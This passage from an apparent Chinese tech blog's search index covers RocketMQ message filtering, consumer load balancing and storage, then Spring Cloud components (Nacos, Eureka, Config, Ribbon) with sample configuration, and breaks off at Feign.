RocketMQ 服务端根据消费者上报的过滤条件的表达式进行匹配，并将符合条件的消息投递给消费者。\n\n消息过滤分类Apache RocketMQ 支持Tag标签过滤和SQL属性过滤，这两种过滤方式对比如下：\n\n\n\n对比项\nTag标签过滤\nSQL属性过滤\n\n\n\n过滤目标\n消息的Tag标签。\n消息的属性，包括用户自定义属性以及系统属性（Tag是一种系统属性）。\n\n\n过滤能力\n精准匹配。\nSQL语法匹配。\n\n\n适用场景\n简单过滤场景、计算逻辑简单轻量。\n复杂过滤场景、计算逻辑较复杂。\n\n\n\nTag标签过滤方式是生产者在发送消息时，设置消息的Tag标签，消费者需指定已有的Tag标签来进行匹配订阅。\n\nSQL属性过滤方式是是生产者定义消息属性，消费者设置SQL过滤条件。生产者发送消息时可以自定义消息属性，每个属性都是一个自定义的键值对（Key-Value）。生产者在发送消息时可设置多个属性，消费者订阅时可设置SQL语法的过滤表达式过滤多个属性。\n\n\n广播消费和共享消费在 Apache RocketMQ 领域模型中，同一条消息支持被多个消费者分组订阅，同时，对于每个消费者分组可以初始化多个消费者。\n可以根据消费者分组和消费者的不同组合，实现以下两种不同的消费效果：\n\n\n消费组间广播消费 ：如上图所示，每个消费者分组只初始化唯一一个消费者，每个消费者可消费到消费者分组内所有的消息，各消费者分组都订阅相同的消息，以此实现单客户端级别的广播一对多推送效果。\n该方式一般可用于网关推送、配置推送等场景。\n\n消费组内共享消费 ：如上图所示，每个消费者分组下初始化了多个消费者，这些消费者共同分担消费者分组内的所有消息，实现消费者分组内流量的水平拆分和均衡负载。\n该方式一般可用于微服务解耦场景。\n\n\n消费者负载均衡策略概述消费者从 Apache RocketMQ 获取消息消费时，通过消费者负载均衡策略，可将主题内的消息分配给指定消费者分组中的多个消费者共同分担，提高消费并发能力和消费者的水平扩展能力。\n消费组间广播消费场景下，每个消费者分组内只有一个消费者，因此不涉及消费者的负载均衡。\n消费组内共享消费场景下，消费者分组内多个消费者共同分担消息，消息按照哪种逻辑分配给哪个消费者，就是由消费者负载均衡策略所决定的。\n根据消费者类型的不同，消费者负载均衡策略分为以下两种模式：\n\n消息粒度负载均衡：是PushConsumer和SimpleConsumer默认的负载策略。\n队列粒度负载均衡：是PullConsumer默认的负载策略。\n\n消息粒度负载均衡策略消息粒度负载均衡策略中，同一消费者分组内的多个消费者将按照消息粒度平均分摊主题中的所有消息，即同一个队列中的消息，可被平均分配给多个消费者共同消费。\n\n如上图所示，消费者分组Group A中有三个消费者A1、A2和A3，这三个消费者将共同消费主题中同一队列Queue1中的多条消息。 \n注意：消息粒度负载均衡策略保证同一个队列的消息可以被多个消费者共同处理，但是该策略使用的消息分配算法结果是随机的，并不能指定消息被哪一个特定的消费者处理。\n消息粒度的负载均衡机制，是基于内部的单条消息确认语义实现的。消费者获取某条消息后，服务端会将该消息加锁，保证这条消息对其他消费者不可见，直到该消息消费成功或消费超时。因此，即使多个消费者同时消费同一队列的消息，服务端也可保证消息不会被多个消费者重复消费。\n消息粒度负载均衡策略在处理顺序消息时，由于同一消息组内的多个消息之间的先后顺序。因此，顺序消息场景下，消息粒度负载均衡策略还需要保证同一消息组内的消息，按照服务端存储的先后顺序进行消费。不同消费者处理同一个消息组内的消息时，会严格按照先后顺序锁定消息状态，确保同一消息组的消息串行消费。\n\n如上图所述，队列Queue1中有4条顺序消息，这4条消息属于同一消息组G1，存储顺序由M1到M4。在消费过程中，前面的消息M1、M2被消费者Consumer A1处理时，只要消费状态没有提交，消费者A2是无法并行消费后续的M3、M4消息的，必须等前面的消息提交消费状态后才能消费后面的消息。\n队列粒度负载均衡策略队列粒度负载均衡策略中，同一消费者分组内的多个消费者将按照队列粒度消费消息，即每个队列仅被一个消费者消费。\n\n如上图所示，主题中的三个队列Queue1、Queue2、Queue3被分配给消费者分组中的两个消费者，每个队列只能分配给一个消费者消费，该示例中由于队列数大于消费者数，因此，消费者A2被分配了两个队列。若队列数小于消费者数量，可能会出现部分消费者无绑定队列的情况。\n队列粒度的负载均衡，基于队列数量、消费者数量等运行数据进行统一的算法分配，将每个队列绑定到特定的消费者，然后每个消费者按照取消息&gt;提交消费位点&gt;持久化消费位点的消费语义处理消息，取消息过程不提交消费状态，因此，为了避免消息被多个消费者重复消费，每个队列仅支持被一个消费者消费。\n备注：队列粒度负载均衡策略保证同一个队列仅被一个消费者处理，该策略的实现依赖消费者和服务端的信息协商机制，Apache RocketMQ 并不能保证协商结果完全强一致。因此，在消费者数量、队列数量发生变化时，可能会出现短暂的队列分配结果不一致，从而导致少量消息被重复处理。\n两种消费者负载均衡策略的对比适用场景：\n\n消息粒度负载均衡策略\n消息粒度消费负载均衡策略下，同一队列内的消息离散地分布于多个消费者，适用于绝大多数在线事件处理的场景。只需要基本的消息处理能力，对消息之间没有批量聚合的诉求。而对于流式处理、聚合计算场景，需要明确地对消息进行聚合、批处理时，更适合使用队列粒度的负载均衡策略。\n\n队列粒度负载均衡适用场景\n相对于消息粒度负载均衡策略，队列粒度负载均衡策略分配粒度较大，不够灵活。但该策略在流式处理场景下有天然优势，能够保证同一队列的消息被相同的消费者处理，对于批量处理、聚合处理更友好。队列粒度负载均衡策略适用于流式计算、数据聚合等需要明确对消息进行聚合、批处理的场景。\n\n\n相对于队列粒度负载均衡策略，消息粒度负载均衡策略有以下特点：\n\n消费分摊更均衡\n传统队列级的负载均衡策略中，如果队列数量和消费者数量不均衡，则可能会出现部分消费者空闲，或部分消费者处理过多消息的情况。消息粒度负载均衡策略无需关注消费者和队列的相对数量，能够更均匀地分摊消息。\n\n对非对等消费者更友好\n对于线上生产环境，由于网络机房分区延迟、消费者物理资源规格不一致等原因，消费者的处理能力可能会不一致，如果按照队列分配消息，则可能出现部分消费者消息堆积、部分消费者空闲的情况。消息粒度负载均衡策略按需分配，消费者处理任务更均衡。\n\n队列分配运维更方便\n队列粒度的负载均衡策略必须保证队列数量大于等于消费者数量，以免产生部分消费者获取不到队列出现空转的情况，而消息粒度负载均衡策略则无需关注队列数。\n\n\n消息存储原理CommitLogRocketMQ单个Broker实例下的所有队列共用一个日志数据文件（CommitLog）来存储。而Kafka采用的是独立型的存储结构，每个队列一个文件。\nCommitLog的文件大小默认是1G（1G &#x3D; 1073741824byte），文件名是字节的起始偏移量，文件名长度是20位，左边补零。\nConsumerQueueConsumerQueue（逻辑消费队列）可以看成是基于Topic和QueueId的CommitLog索引文件，提供了一种可以通过Topic和QueueId来查询消息队列的方法。\n由于RocketMQ是基于主题（Topic）的订阅模式，消息消费是针对主题进行的，如果遍历CommitLog文件，根据Topic检索消息是非常低效的。使用ConsumerQueue可以快速查找CommitLog中待消费的消息。\nIndexFileIndexFile（索引文件）可以看成是基于Key或时间区间的CommitLog索引文件。提供了一种可以通过Key或时间区间来查询消息的方法。\n页缓存与内存映射页缓存（Page Cache）是操作系统（OS）对文件的缓存，用于加速对文件的读写，实现原理是OS将一部分内存用作PageCache，对于数据的写入，OS会先写入Cache内，然后通过异步的方式将Cache内的数据刷至物理磁盘上。\nRocketMQ中的ConsumerQueue就是基于页缓存机制达到读写速度接近内存读写速度。\nRocketMQ主要通过MappedByteBuffer对文件进行读写操作，MappedByteBuffer是 Java NIO 中的一个类，它提供了一种将文件的内容映射到进程的地址空间中，使得可以像访问内存一样来访问文件的内容（内存映射）的方法。\n消息刷盘RocketMQ支持的消息刷盘包括同步刷盘和异步刷盘两种，指定了消息是否真正持久化到Broker磁盘后才给Producer反馈。\n\n同步刷盘：只有在消息真正持久化到磁盘后，Broker端才会真正返回给Producer端一个成功的ACK响应。\n异步刷盘：只要消息写入PageCache，Broker就返回给Producer端ACK响应。这种方式能够充分利用OS的页缓存机制的优势。\n\nReferences\nhttps://rocketmq.apache.org/\nhttps://github.com/apache/rocketmq\nhttps://rocketmq.apache.org/zh/\n\n","categories":["IT"],"tags":["RocketMQ"]},{"title":"Spring Cloud","url":"/2023/05/24/Spring-Cloud/","content":"Spring Cloud概述微服务架构与Spring Cloud微服务架构是一种以单一应用程序开发为一组小型服务的代码结构，每个服务运行在自己的进程中，服务间采用轻量级通信机制（如HTTP）进行通信。这些服务可以独立部署，不同服务可以使用不同语言开发，使用不同的数据存储技术。\n为了降低构建和维护分布式系统的难度，加快微服务的落地，Spring Cloud提供了快速构建分布式微服务系统的一些常用功能，如配置管理、服务发现、断路器、路由、服务代理、控制总线等工具。使用这些工具可以快速构建分布式微服务架构的系统。\nSpring Cloud与DubboDubboApache Dubbo 是一款 RPC 服务开发框架，用于解决微服务架构下的服务治理与通信问题。利用 Dubbo 提供的丰富服务治理特性，可以实现诸如服务发现、负载均衡、流量调度等服务治理诉求。\n官网对Dubbo的含义的介绍：\n\nDubbo的产生原因：微服务的分布式特性，使得应用间的依赖、网络交互、数据传输变得更频繁，因此不同的应用需要定义、暴露或调用 RPC 服务，那么这些 RPC 服务如何定义、如何与应用开发框架结合、服务调用行为如何控制？\nDubbo的含义：Dubbo 在微服务应用开发框架之上抽象了一套 RPC 服务定义、暴露、调用与治理的编程范式。\n\nDubbo支持的注册中心的官网介绍。\nSpring Cloud与Dubbo的区别Dubbo主要用来实现服务治理，而Spring Cloud的各个组件实现了微服务架构下的所需的各种功能，服务治理只是其中的一个方面。\nDubbo的在Spring Cloud Netfix技术架构中的替代方案可以是，通过Consul或Eureka Server等实现服务注册中心（对应Dubbo中的注册中心），通过Ribbon实现软负载均衡。 \nSpring Cloud Netfix和Spring Cloud AlibabaSpring Cloud Netfix和Spring Cloud Alibaba是Spring Cloud的两套技术架构。\nSpring Cloud NetfixSpring Cloud Netfix在官方文档中介绍：该项目通过自动配置和绑定到Spring环境和其他Spring编程模型的习惯方式来为Spring Boot应用程序提供Netflix OSS集成。通过几个简单的注释，用户可以快速启用和配置应用程序中的常见模式，并通过经过测试的Netflix组件构建大型分布式系统。提供的组件包括服务发现（Eureka），断路器（Hystrix），智能路由（Zuul）和客户端负载平衡（Ribbon）。可以从Netfix的GitHub中找到这些组件。\nSpring Cloud AlibabaSpring Cloud Alibaba的相关文档：Spring Cloud Alibaba参考文档、Spring Cloud Alibaba中文版README.md。其提供的组件有：Sentinel(分布式流控：流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性)、Nacos（注册中心）、RocketMQ（分布式消息组件）、Seata（分布式事务组件）等。\n服务注册中心和配置中心服务注册中心提供了服务注册和服务发现功能\n\n服务注册：所有服务的提供方启动时向注册中心发送自己的信息，包括地址、端口、提供的服务等。\n服务发现：当服务调用方需要调用服务时，只需要向注册中心查询谁提供了自己需要的服务。\n\nZookeeper（注册中心和配置中心）功能Zookeeper可以解决分布式应用中的服务的注册和发现、统一命名服务、状态同步服务、集群管理、分布式应用配置管理等问题。可以替代Eureka、Spring Cloud Config。不能替代路由网关（Zuul）、负载均衡（Ribbon）、断路器（Hystricx）等。\n使用方法\n启动Zookeeper的服务，可以使用Docker等方法启动Zookeeper。\n在Zookeeper服务提供方：\n添加依赖spring-cloud0zookeeper-discovery和org.apache.curator。注：Zookeeper通过Curator（Curator 是一个 Apache ZooKeeper 客户端框架）实现了服务注册和发现功能，实现了和Eureka相同的功能。\n在配置文件中添加对Zookeeper的配置，指定Zookeeper服务暴露的的连接ip和端口。\n在启动类添加@EnableDiscoveryClient注解。\n\n\n在服务消费方：\n添加依赖\n添加配置信息\n\n\n\nNacos（注册中心和配置中心）功能和特性Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。\nNacos官网给出的关键特性包括:\n\n服务发现和服务健康监测\nNacos 支持基于 DNS 和基于 RPC 的服务发现。服务提供者使用 原生SDK、OpenAPI、或一个独立的Agent TODO注册 Service 后，服务消费者可以使用DNS TODO或HTTP&amp;API查找和发现服务。\nNacos 提供对服务的实时的健康检查，阻止向不健康的主机或服务实例发送请求。Nacos 支持传输层 (PING 或 TCP)和应用层 (如 HTTP、MySQL、用户自定义）的健康检查。 对于复杂的云环境和网络拓扑环境中（如 VPC、边缘网络等）服务的健康检查，Nacos 提供了 agent 上报模式和服务端主动检测2种健康检查模式。Nacos 还提供了统一的健康检查仪表盘，帮助用户根据健康状态管理服务的可用性及流量。\n\n动态配置服务\n动态配置服务可以让用户以中心化、外部化和动态化的方式管理所有环境的应用配置和服务配置。\n动态配置消除了配置变更时重新部署应用和服务的需要，让配置管理变得更加高效和敏捷。\n配置中心化管理让实现无状态服务变得更简单，让服务按需弹性扩展变得更容易。\nNacos 提供了一个简洁易用的UI (控制台样例 Demo) 帮助用户管理所有的服务和应用的配置。Nacos 还提供包括配置版本跟踪、金丝雀发布、一键回滚配置以及客户端配置更新状态跟踪在内的一系列开箱即用的配置管理特性，帮助用户更安全地在生产环境中管理配置变更和降低配置变更带来的风险。\n\n动态 DNS 服务\n动态 DNS 服务支持权重路由，让用户更容易地实现中间层负载均衡、更灵活的路由策略、流量控制以及数据中心内网的简单DNS解析服务。动态DNS服务还能让用户更容易地实现以 DNS 协议为基础的服务发现，以帮助用户消除耦合到厂商私有服务发现 API 上的风险。\nNacos 提供了一些简单的 DNS APIs TODO 帮助用户管理服务的关联域名和可用的 IP:PORT 列表.\n\n服务及其元数据管理\nNacos 能让用户从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及最首要的 metrics 统计数据。\n\n\n使用方法\n在创建的SpringBoot项目中添加依赖nacos-discovery-spring-boot- starter\n创建Controller类，通过@NacosInjected注入Nacos的NamingService，并提供discovery方法用于根据服务名称获取注册到Nacos上的服务地址\n添加对Nacos服务地址的配置\n\n高可用在分布式架构中，任何中间件或者应用都不允许单点存在，所以开源组件一般都会支持高可用的集群。Nacos的集群架构类似于Zookeeper，包含一个Leader节点和多个Follower节点，和Zookeeper不同的是，它的数据一致性算法使用的是Raft。\nNacos支持Derby和MySQL两种持久化机制，默认使用的是Derby数据库，Derby的吞吐量没有MySQL大，生产环境中可以使用MySQL替换，如果使用MySQL，需要运行nacos-mysql-sql脚本创建数据库和表。\nDubbo使用Nacos作为注册中心\n官方文档：Dubbo x Spring Boot 开发\n\n\n在一个Maven项目（spring-boot-dubbo-sample）中添加三个模块，分别用来声明接口（nacos-sample-interface）、实现接口（nacos-sample-provider）和使用接口（nacos-sample-consumer）的实现类。\n\n在声明接口的模块（nacos-sample-interface）中声明接口，打包安装模块。\n\n在实现接口的模块（nacos-sample-provider）中添加三个依赖nacos-discovery-spring-boot-starter（Nacos的Starter组件）、dubbo-spring-boot-starter（Dubbo的Starter组件）以及nacos-sample-api（声明接口的模块名）；\n创建接口的实现类，并在实现类中添加@DubboService 注解（@Service 注解从 3.0 版本开始就已经废弃，改用 @DubboService，以区别于 Spring 的 @Service 注解）；配置Dubbo 的应用名（dubbo.application.name）、Dubbo 协议信息（dubbo.protocol）、Dubbo 使用的注册中心地址（dubbo.register.adderss）等信息。配置示例：\ndubbo:  application:    name: nacos-sample-provider  protocol:    name: dubbo    port: -1  registry:    address: nacos://127.0.0.1:8848    #如果使用Zookeeper作为注册中心，只需要修改此address如下    #address: zookeeper:127.0.0.1:2181\n\n在启动类中添加注解@EnableDubbo。\n\n在使用接口的实现类的模块（nacos-sample-consumer）使用@DubboReference注解（@Reference 注解从 3.0 版本开始就已经废弃，改用 @DubboReference，以区别于 Spring 的 @Reference 注解）即可获取nacos-sample-provider中的实现类对象；在配置文件中配置Dubbo 的应用名、Dubbo 协议信息、Dubbo 使用的注册中心地址；在启动类中添加注解@EnableDubbo。\n\n\nNacos源码（待完善）根据注册中心的主要功能确定Nacos源码关键的部分有：服务注册、服务地址的获取、服务变化的感知。\n\n服务注册\n服务地址的获取\n服务变化的感知\n\nNacos作为配置中心使用方法：\n\n引入依赖spring-cloud-starter-alibaba-nacos-config。\n添加配置，使用 bootstrap.properties 配置文件来配置Nacos Server 地址、文件扩展名。\n\n特性：\n\nspring-cloud-starter-alibaba-nacos-config 支持配置的动态更新\n可以通过配置 spring.cloud.nacos.config.refresh.enabled=false 来关闭动态刷新\n\n可支持profile粒度的配置\nspring-cloud-starter-alibaba-nacos-config 在加载配置的时候，不仅仅加载了以 dataId 为 $&#123;spring.application.name&#125;.$&#123;file-extension:properties&#125; 为前缀的基础配置，还加载了dataId为 $&#123;spring.application.name&#125;-$&#123;profile&#125;.$&#123;file-extension:properties&#125; 的基础配置。在日常开发中如果遇到多套环境下的不同配置，可以通过Spring 提供的 $&#123;spring.profiles.active&#125; 这个配置项来配置。\nspring.profiles.active=develop\n\n支持自定义 namespace 的配置\n首先看一下 Nacos 的 Namespace 的概念， Nacos 概念\n\n用于进行租户粒度的配置隔离。不同的命名空间下，可以存在相同的 Group 或 Data ID 的配置。Namespace 的常用场景之一是不同环境的配置的区分隔离，例如开发测试环境和生产环境的资源（如配置、服务）隔离等。\n\n在没有明确指定 $&#123;spring.cloud.nacos.config.namespace&#125; 配置的情况下， 默认使用的是 Nacos 上 Public 这个namespace。如果需要使用自定义的命名空间，可以通过以下配置来实现：\nspring.cloud.nacos.config.namespace=b3404bc0-d7dc-4855-b519-570ed34b62d7\n\n该配置必须放在 bootstrap.properties 文件中。此外 spring.cloud.nacos.config.namespace 的值是 namespace 对应的 id，id 值可以在 Nacos 的控制台获取。并且在添加配置时注意不要选择其他的 namespace，否则将会导致读取不到正确的配置。\n\n支持自定义 Group 的配置\n在没有明确指定 $&#123;spring.cloud.nacos.config.group&#125; 配置的情况下， 默认使用的是 DEFAULT_GROUP 。如果需要自定义自己的 Group，可以通过以下配置来实现：\nspring.cloud.nacos.config.group=DEVELOP_GROUP\n\n该配置必须放在 bootstrap.properties 文件中。并且在添加配置时 Group 的值一定要和 spring.cloud.nacos.config.group 的配置值一致。\n\n支持自定义扩展的 Data Id 配置\nSpring Cloud Alibaba Nacos Config 从 0.2.1 版本后，可支持自定义 Data Id 的配置。关于这部分详细的设计可参考 这里。 一个完整的配置案例如下所示：\nspring.application.name=opensource-service-providerspring.cloud.nacos.config.server-addr=127.0.0.1:8848# config external configuration# 1、Data Id 在默认的组 DEFAULT_GROUP,不支持配置的动态刷新spring.cloud.nacos.config.extension-configs[0].data-id=ext-config-common01.properties# 2、Data Id 不在默认的组，不支持动态刷新spring.cloud.nacos.config.extension-configs[1].data-id=ext-config-common02.propertiesspring.cloud.nacos.config.extension-configs[1].group=GLOBALE_GROUP# 3、Data Id 既不在默认的组，也支持动态刷新spring.cloud.nacos.config.extension-configs[2].data-id=ext-config-common03.propertiesspring.cloud.nacos.config.extension-configs[2].group=REFRESH_GROUPspring.cloud.nacos.config.extension-configs[2].refresh=true\n\n可以看到:\n\n通过 spring.cloud.nacos.config.extension-configs[n].data-id 的配置方式来支持多个 Data Id 的配置。\n通过 spring.cloud.nacos.config.extension-configs[n].group 的配置方式自定义 Data Id 所在的组，不明确配置的话，默认是 DEFAULT_GROUP。\n通过 spring.cloud.nacos.config.extension-configs[n].refresh 的配置方式来控制该 Data Id 在配置变更时，是否支持应用中可动态刷新， 感知到最新的配置值。默认是不支持的。\n\n多个 Data Id 同时配置时，他的优先级关系是 spring.cloud.nacos.config.extension-configs[n].data-id 其中 n 的值越大，优先级越高。\nspring.cloud.nacos.config.extension-configs[n].data-id 的值必须带文件扩展名，文件扩展名既可支持 properties，又可以支持 yaml&#x2F;yml。 此时 spring.cloud.nacos.config.file-extension 的配置对自定义扩展配置的 Data Id 文件扩展名没有影响。\n通过自定义扩展的 Data Id 配置，既可以解决多个应用间配置共享的问题，又可以支持一个应用有多个配置文件。\n为了更加清晰的在多个应用间配置共享的 Data Id ，你可以通过以下的方式来配置：\n# 配置支持共享的 Data Idspring.cloud.nacos.config.shared-configs[0].data-id=common.yaml# 配置 Data Id 所在分组，缺省默认 DEFAULT_GROUPspring.cloud.nacos.config.shared-configs[0].group=GROUP_APP1# 配置Data Id 在配置变更时，是否动态刷新，缺省默认 falsespring.cloud.nacos.config.shared-configs[0].refresh=true\n\n可以看到：\n\n通过 spring.cloud.nacos.config.shared-configs[n].data-id 来支持多个共享 Data Id 的配置。\n通过 spring.cloud.nacos.config.shared-configs[n].group 来配置自定义 Data Id 所在的组，不明确配置的话，默认是 DEFAULT_GROUP。\n通过 spring.cloud.nacos.config.shared-configs[n].refresh 来控制该Data Id在配置变更时，是否支持应用中动态刷新，默认false。\n\n\n配置的优先级\nSpring Cloud Alibaba Nacos Config 目前提供了三种配置能力从 Nacos 拉取相关的配置。\n\nA: 通过 spring.cloud.nacos.config.shared-configs[n].data-id 支持多个共享 Data Id 的配置\nB: 通过 spring.cloud.nacos.config.extension-configs[n].data-id 的方式支持多个扩展 Data Id 的配置\nC: 通过内部相关规则(应用名、应用名+ Profile )自动生成相关的 Data Id 配置\n\n当三种方式共同使用时，他们的一个优先级关系是:A &lt; B &lt; C\n\n完全关闭配置\n通过设置 spring.cloud.nacos.config.enabled &#x3D; false 来完全关闭 Spring Cloud Nacos Config\n\n\nConsul（注册中心和配置中心）功能Consul是HashiCrop公司推出的开源工具，提供了服务注册和发现、分布式一致性协议实现、健康检查、Key&#x2F;Value存储、多数据中心方案等。\n使用方法\n启动Consul服务，可以使用Docker等方法启动Consul。\n其它步骤参加Zookeeper的使用方法，不同的是依赖是spring-cloud-consul-discovery\n\nEureka（注册中心）功能和组成Eureka提供了完整的服务注册和服务发现功能，以及负载均衡、故障转移的功能，不支持配置管理的功能，所以不适合作为配置中心。\n主要包含两个部分：Eureka Server、Eureka Client：\n\nEureka Server: 服务注册中心，用于管理各种微服务实例的注册与发现。Eureka Server提供了一种能力，让各个微服务之间彼此连接并互相感知。每当有新的微服务被启动时，它会向Eureka Server节点发送一个REST请求，并且在该服务器上进行注册。同时，对于已经注册的微服务，Eureka Server会接收并存储它们发送的心跳信息，以便为客户端提供最新可用的服务列表。\n\nEureka Client: （微）服务实例，用于与Eureka Server注册中心进行交互。Eureka Client会向Eureka Server注册自己，并定期发送心跳消息来更新它的状态。同时，它还可以查询Eureka Server上已注册的其他微服务实例的信息，并通过负载均衡算法从可用的微服务列表中选择合适的服务来处理请求。服务提供方和服务消费方都是Eureka Client。\n\n\nEureka Server和Eureka Client之间的协作使得微服务可以快速地、灵活地进行部署和扩展，并且可以轻松地进行服务监控和故障排除。\n使用方法\n在Eureka Server中，添加pom依赖（spring-cloud-strater-eureka-server），在启动类上添加@EnableEurekaServer注解表示该服务是一个EurekaServer。\n在Eureka Client中，添加pom依赖（spring-cloud-strater-eureka），在application.yml中添加配置（配置注册中心的地址defaultZone和自身的名字name），在启动类上添加@EnableEurekaClient注解表示该服务是一个EurekaClient。\n\n健康检查Eureka通过客户端（Eureka Client）的心跳包来检测客户端状态，但是这种方式只能检测客户端是否在线，不能保证客户端可以对外提供服务，这是因为客户端可能依赖了其它的资源，如数据库、缓存等，如果其依赖的服务无法正常使用，那么即使客户端在线，也不能对外提供服务，这时就需要客户端自己向Eureka Server提供自身的状态。\n开启Eureka的健康检查，客户端就能将自身状态就可以传送给Eureka Server了。在application.yml中添加配置即可开启Eureka的健康检查。\nEureka Client有如下状态：UP、DOWN、STARTING、OUT_OF_SERVICE、UNKNOWN\n自我保护模式自我保护模式是一种应对网络异常的安全保护机制，它的理念是宁可同时保留所有实例（健康的实例和不健康的实例），也不盲目注销任何健康的实例。\n就近原则Eureka有Region和Zone的概念，Region可以理解为区、Zone可以理解为机房。Eureka Serve启动时需要指定自己所在的默认Zone。Eureka Client启动时也需要指定Zone，Eureka Client会优先请求自己的Zone下的Eureka Serve列表中的Eureka Serve；如果没有指定，会默认使用defaultZone作为自己的Zone。\nConfig（配置中心）功能、特点和组成在研发流程中有测试环境、UAT（User Acceptance Testing，用户验收测试）环境、生产环境等，每个微服务对应多个不同环境的配置文件，修改配置文件十分繁琐。这就需要引入配置中心组件。\nSpring Cloud Config提供了分布式配置管理功能。特点如下：\n\n服务器存储后端的默认实现使用git。\n支持丰富的文件格式，包括yml、json、properities等，还可以自定义文件格式。\n配合Spring Cloud Bus可实现配置推送。\nSpring Boot项目中不需要改动代码，加入一个启动配置文件指明使用Config Server中哪个配置文件即可。\n\n主要包含两个部分：Config Client、Config Server。\n使用方法\nConfig的配置必须放在bootstrap.properities中，才能被正确加载，因为放在bootstrap.properities中才能确保config相关的配置先于application.properities加载（bootstrap.properities的加载先于application.properities）。\n在Config Server中，添加pom依赖，在启动类上添加@EnableConfigServer注解表示允许该服务以HTTP形式对外提供配置管理服务。\n在Config Client中，添加pom依赖，在启动类上添加@EnableAutoConfiguration注解表示自动向Config Server获取项目的配置。\n\n热生效热生效是指，让修改后的配置动态生效。\n用法是在Config Client的启动类上添加@RefreshScope注解。此外，还需要搭配Spring Cloud Bus，通知Config Client进行本地配置更新。\n高可用通过将所有Config Server实例以服务提供方的形式注册到Eureka（或其它的服务注册中心）上，Config Client以服务消费方的形式从Eureka获取Config Server的实例。由Eureka提供故障转移、服务注册和发现等功能。\n使用方法：\n\n在Config Server（作为Eureka Client）添加pom依赖，在配置文件application.yml中添加对Eureka注册中心的配置，在启动类上添加注解（具体方法见Eureka的使用方法之Eureka Client的配置方法）。\n\n在Config Client（也是作为Eureka Client）添加pom依赖，在启动类上添加注解（具体方法见Eureka的使用方法之Eureka Client的配置方法）。\n不同的是添加配置的位置是bootstrap.yml，在bootstrap.yml中添加对Eureka注册中心的配置，并在原Config Client配置的基础上删除spring.cloud.config.uri的静态的指定，改为将spring.cloud.config.discovery.enabled设为true， 并通过spring.cloud.config.discovery.serviceId指定在注册中心配置的serviceId。\n\n\n消息总线Bus功能Bus的一个常用功能是进行配置中心客户端的配置刷新。当Git Repository改变时，Bus会通过POST请求Config Server的&#x2F;bus&#x2F;refresh，Config Server会从Repository获取最新的信息并传递给Client。通过&#x2F;bus&#x2F;refresh的destination参数可以指定刷新某一台Client实例。\nBus的配置刷新通知功能是基于Spring的事件机制实现的，这些事件是可追踪的。\n负载均衡概念分类负载均衡可以简单分为 服务端负载均衡 和 客户端负载均衡 这两种。\n\n服务端负载均衡 主要应用在 系统外部请求 和 网关层 之间，可以使用 软件 或者 硬件 实现。软件负载均衡通过软件（比如 LVS、Nginx、HAproxy ）实现负载均衡功能\n\n\n客户端负载均衡 主要应用于系统内部的不同的服务之间，可以使用现成的负载均衡组件来实现。在客户端负载均衡中，客户端会自己维护一份服务器的地址列表，发送请求之前，客户端会根据对应的负载均衡算法来选择具体某一台服务器处理请求。\n\n\n\n负载均衡常见的算法\n随机法\n策略：每次从可用的服务实例列表中随机选择一个实例来处理请求，可以设置权重。\n权重：如果没有配置权重的话（适合于服务器性能相近的集群），所有的服务器被访问到的概率都是相同的。如果配置权重（适合于服务器性能不等的集群）的话，权重越高的服务器被访问的概率就越大。\n缺陷：部分机器在一段时间之内无法被随机到。轮询法可以避免这个问题\n\n轮询法\n策略：挨个轮询服务器处理，也可以设置权重。\n\n一致性 Hash 法\n策略：相同参数的请求总是发到同一台服务器处理，比如同个 IP 的请求。\n\n最小连接法\n策略：当有新的请求出现时，遍历服务器节点列表并选取其中活动连接数最小的一台服务器来响应当前请求。活动连接数可以理解为当前正在处理的请求数。\n最小连接法可以尽可能最大地使请求分配更加合理化，提高服务器的利用率。\n缺陷：这种方法实现起来最复杂，需要监控每一台服务器处理的请求连接数。\n\n\nRibbon功能Ribbon最主要的功能是提供了客户端的负载均衡算法，还提供了一系列完整的服务调用配置项，如连接超时、失败重试、访问权重、调用优先级等。\n使用方法\n在Eureka的客户端代码的基础上进行改造\n将DiscoveryClient改为LoadBalancerClient，并调用其choose方法，会使原先得到的ServiceInstance集合变为得到单个ServiceInstance实例。\n\n使用@LoadBalanced注解\n在启动类上（通常，有时也用在配置类上、组件类上等）使用@RibbonClient注解设置需要调用的服务名，在RestTemplate的bean对象上使用@LoadBalanced注解。\n如果想要自定义参数和策略，就需要使用自定义配置：\n\n使用@RibbonClient注解时，可以设置configuration的值来自定义配置类。\n也可以使用配置文件，在配置文件中指定使用的配置类\n\n\n\n负载均衡策略Ribbon 支持的 7 种负载均衡策略：\n\nRandomRule：随机策略。\nRoundRobinRule（默认）：轮询策略\nWeightedResponseTimeRule：权重（根据响应时间决定权重）策略\nBestAvailableRule：最小连接数策略\nRetryRule：重试策略（按照轮询策略来获取服务，如果获取的服务实例为 null 或已经失效，则在指定的时间之内不断地进行重试来获取服务，如果超过指定时间依然没获取到服务实例则返回 null）\nAvailabilityFilteringRule：可用敏感性策略（先过滤掉非健康的服务实例，然后再选择连接数较小的服务实例）\nZoneAvoidanceRule：区域敏感性策略（根据服务所在区域的性能和服务的可用性来选择服务实例）\n\nLoadBalancer负载均衡策略Spring Cloud LoadBalancer 支持的 2 种负载均衡策略：\n\nRandomLoadBalancer：随机策略\nRoundRobinLoadBalancer（默认）：轮询策略\n\n声明式RESTful客户端FeignFeign是一个在Java开发中广泛使用的声明式Web服务客户端框架，由Netflix开发并开源。它旨在简化使用RESTful 